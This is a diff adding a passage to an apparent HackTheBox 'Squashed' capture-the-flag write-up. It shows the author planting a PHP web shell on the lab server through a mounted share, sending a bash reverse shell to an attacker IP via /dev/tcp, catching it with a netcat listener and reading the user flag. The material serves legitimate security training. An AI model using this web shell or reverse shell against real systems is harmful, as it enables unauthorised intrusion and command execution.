@@ -381,3 +381,84 @@ NOTE: I had added the IP and its host in `/etc/hosts` file
 
 sqs-2
 
+So now, I tried to check if the site was able to handle the `PHP` code, cause its worth taking a shot and seeing it whether the webserver will execute PHP or not.
+
+I wrote a small script that echoes back a message.
+
+```
+fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ echo -e '<?php\n  echo "This is a PHP test script";\n?>'
+<?php
+  echo "This is a PHP test script";
+?>
+fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ echo -e '<?php\n  echo "This is a PHP test script";\n?>' > /mnt/test.php
+```
+
+On visiting the `http://squashed.htb/test/php`, I was able to see the following image which was a clear indication of `php` being executed on the site.
+
+sqs-3
+
+So now, I overwrite the same file with a simple `PHP` web-shell.
+
+```
+fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>'
+<?php
+  system($_REQUEST[cmd]);
+?>
+fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > /mnt/test.php
+```
+
+Visiting the website, if I just load the page, there’s nothing there. But if I add `?cmd=id` to the end:
+
+sqs-4
+
+
+TO go from this webshell to a full reverse shell, I'll just pass in a bash reverse shell as `cmd`:
+
+```
+bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
+```
+NOTE: In order for the reverse shell to work, you'll have to URL encode it.
+
+Before that, I turned on my netcat listener on the same port that I passed in through the bash command.
+
+```
+nc -lvnp 4444
+```
+
+Once I hit send on the website, and checked on my netcat listener, I immediately got back a reverse shell
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.53] from (UNKNOWN) [10.10.11.191] 57842
+bash: cannot set terminal process group (1078): Inappropriate ioctl for device
+bash: no job control in this shell
+alex@squashed:/var/www/html$ whoami
+whoami
+alex
+```
+
+Grabbing the user flag.
+
+```
+alex@squashed:/var/www/html$ ls
+ls
+css
+images
+index.html
+js
+alex@squashed:/var/www/html$ cd /home
+cd /home
+alex@squashed:/home$ ls
+ls
+alex
+ross
+alex@squashed:/home$ cd alex
+cd alex
+alex@squashed:/home/alex$ cat user.txt
+cat user.txt
+[REDACTED]
+
+```
+
